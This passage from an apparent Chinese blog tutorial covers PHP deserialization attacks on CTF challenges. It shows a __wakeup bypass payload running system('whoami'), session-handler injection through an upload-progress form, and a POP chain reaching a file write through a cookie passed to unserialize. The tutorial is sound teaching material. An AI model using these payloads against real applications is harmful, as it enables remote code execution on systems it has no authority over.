class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>__wakeup会在反序列化之前执行，所以怎么样对象被销毁的时候都是要执行phpinfo的，那怎么绕过</p><p>__wakeup呢？需要构造如下序列化对象：</p><pre><code>O%3A1%3A&quot;A&quot;%3A2%3A%7Bs%3A7%3A&quot;%00A%00name&quot;%3Bs%3A17%3A&quot;system%28&quot;whoami&quot;%29%3B&quot;%3B%7D</code></pre><p>这里对象的属性个数是1，我设置为大于1就绕过了__wakeup，所以当序列化的结果的对象属性大于本身类的对象属性就可以绕过wakeup魔术方法。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/2.png" alt="2" loading="lazy"></p><h4 id="Session反序列化"><a href="#Session反序列化" class="headerlink" title="Session反序列化"></a><strong>Session反序列化</strong></h4><p>php的session在存储和读取的时候，会进行序列化和反序列化，在php中有3种序列化的方式，当在php.ini中设置如下值：</p><table><thead><tr><th>session.serialize_handler</th><th>存储方式</th></tr></thead><tbody><tr><td>php</td><td>键名+竖线+经过serialize序列化的字符串</td></tr><tr><td>php_serialize</td><td>serialize序列化的的值</td></tr><tr><td>php_binary</td><td>键名的长度对应的 ASCII 字符＋键名＋经过serialize()函数反序列处理的值</td></tr></tbody></table><p>举个列子</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'session.serialize_handler'</span><span class="token punctuation">,</span><span class="token string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'fanxing'</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>当session.serialize_handler为php的时候，存储的session结果为</p><pre><code>name|s:7:&quot;fanxing&quot;;</code></pre><p>当session.serialize_handler为php_serialize的时候，存储的session结果为</p><pre><code>a:1:{s:4:&quot;name&quot;;s:7:&quot;fanxing&quot;;}</code></pre><p>当session.serialize_handler为php_binary的时候，存储的session结果为</p><pre><code>二进制字符串names:7:&quot;fanxing&quot;</code></pre><p>php大于5.5.4的版本默认使用的是php_serialize。</p><p>在php.ini中，还要了解一些关于session的配置：</p><p>session.save_path    session保存的路径</p><p>session.upload_progress.cleanup    上传完成后(POST)会立即删除进度，默认开启</p><p>session.upload_progress.enabled    将上传的进度存于session，默认开启</p><pre><code>当 session.upload_progress.enabled INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是session.upload_progress.prefix 与 session.upload_progress.name连接在一起的值。</code></pre><p>这里利用CTF的一道题目：<a href="http://web.jarvisoj.com:32784/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/index.php</a></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//A webshell is wait for you</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">OowoO</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$mdzz</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mdzz</span> <span class="token operator">=</span> <span class="token string">'phpinfo();'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mdzz</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'phpinfo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OowoO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_string</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'sessiontest.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>可以看到题目使用的是php5.6.21，默认使用的是php_serialize，而题目使用的是php，所以可以利用session.upload_progress.enabled来构造session。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://web.jarvisoj.com:32784/index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    &lt;input type="hidden" name="<span class="token prolog">&lt;?php echo ini_get("session.upload_progress.name"); ?></span>" value="123" />    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><p>构造payload</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">OowoO</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$mdzz</span><span class="token operator">=</span><span class="token string">'print_r(dirname(__FILE__));'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OowoO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>在filename处提交payload：|O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:27:&quot;print_r(dirname(<strong>FILE</strong>));&quot;;}</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/3.png" alt="3" loading="lazy"></p><p>之后就可以构造payload读取本地的文件，具体可以参考<a href="https://xz.aliyun.com/t/3674#toc-9" target="_blank" rel="noopener">先知twosmi1e师傅</a>和博客<a href="https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E4%BE%8B%E9%A2%98%E4%B8%80" target="_blank" rel="noopener">Mochazz师傅的文章</a>。</p><h4 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a><strong>POP链构造</strong></h4><p>在反序列化攻击中，一般都要寻找魔术方法中的一些敏感函数来触发漏洞，当魔法方法中不存在敏感函数时，需要构造pop链寻找相同函数将类的属性和敏感函数联系到一起。</p><p>这里，参考了这位<a href="http://redteam.today/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">师傅</a>的题目，题目部分代码我删了下，看原题可以去连接看这位师傅的。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">OutputFilter</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$matchPattern</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$replacement</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token variable">$repl</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">matchPattern</span> <span class="token operator">=</span> <span class="token variable">$pattern</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">replacement</span> <span class="token operator">=</span> <span class="token variable">$repl</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">matchPattern</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">replacement</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">LogFileFormat</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$filters</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$endl</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filters</span><span class="token punctuation">,</span> <span class="token variable">$endl</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filters</span> <span class="token operator">=</span> <span class="token variable">$filters</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">endl</span> <span class="token operator">=</span> <span class="token variable">$endl</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">format</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filters</span> <span class="token keyword">as</span> <span class="token variable">$filter</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token variable">$filter</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">endl</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$txt</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">LogWriter_File</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$format</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$format</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">".."</span><span class="token punctuation">,</span> <span class="token string">"__"</span><span class="token punctuation">,</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"_"</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">format</span> <span class="token operator">=</span> <span class="token variable">$format</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">writeLog</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">format</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//TODO: Modify the address here, and delete this TODO.</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"D:\\phpStudy\\WWW\\ctf"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Logger</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$logwriter</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//这里装入LogWriter_File对象</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$writer</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logwriter</span> <span class="token operator">=</span> <span class="token variable">$writer</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//这里偷梁换柱Song的log</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logwriter</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">writeLog</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Song</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$logger</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$group</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$url</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$group</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">group</span> <span class="token operator">=</span> <span class="token variable">$group</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">url</span> <span class="token operator">=</span> <span class="token variable">$url</span><span class="token punctuation">;</span>        <span class="token variable">$fltr</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">OutputFilter</span><span class="token punctuation">(</span><span class="token string">"/\[i\](.*)\[\/i\]/i"</span><span class="token punctuation">,</span> <span class="token string">"&lt;i>\\1&lt;/i>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logger</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Logger</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">LogWriter_File</span><span class="token punctuation">(</span><span class="token string">"song_views"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">LogFileFormat</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$fltr</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"&lt;a href='"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span>url <span class="token punctuation">.</span> <span class="token string">"'>&lt;i>"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/i>&lt;/a> by "</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">group</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">logger</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Song "</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token punctuation">.</span> <span class="token string">" by [i]"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">group</span> <span class="token punctuation">.</span> <span class="token string">"[/i] viewed.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Lyrics</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$lyrics</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$song</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$lyrics</span><span class="token punctuation">,</span> <span class="token variable">$song</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span> <span class="token operator">=</span> <span class="token variable">$song</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lyrics</span> <span class="token operator">=</span> <span class="token variable">$lyrics</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"&lt;p>"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>&lt;p>"</span> <span class="token punctuation">.</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lyrics</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">shortForm</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"&lt;p>&lt;a href='song.php?name="</span> <span class="token punctuation">.</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span>song<span class="token operator">-</span><span class="token operator">></span><span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"'>"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/a>&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">name_is</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">addLyrics</span><span class="token punctuation">(</span><span class="token variable">$lyrics</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$oldlyrics</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'lyrics'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$oldlyrics</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'lyrics'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$lyrics</span> <span class="token keyword">as</span> <span class="token variable">$lyric</span><span class="token punctuation">)</span> <span class="token variable">$oldlyrics</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token variable">$lyric</span><span class="token punctuation">;</span>        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'lyrics'</span><span class="token punctuation">,</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$oldlyrics</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">getLyrics</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'lyrics'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'lyrics'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'lyrics'</span><span class="token punctuation">,</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span>User<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">getLyrics</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>在进行反序列化漏洞的时候，我们需要找到可控的unserialize，这里发现$_COOKIE[‘lyrics’]参数可控，有了可控的参数，就需要找到魔术方法来自动调用，这里危险函数在LogWriter_File这个类，这时就需要构造POP链了。</p><p>首先来看魔术方法，在Lyrics类中存在两个魔术方法，发现对象在销毁的时候调用了$this-&gt;song-&gt;log()，而log方法又在Logger这个类中存在，所以属性$this-&gt;song应该为new Logger()。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name">Lyrics</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$lyrics</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$song</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Logger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lyrics</span> <span class="token operator">=</span> <span class="token string">'111'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token string">"&lt;p>"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">song</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;/p>&lt;p>"</span> <span class="token punctuation">.</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span 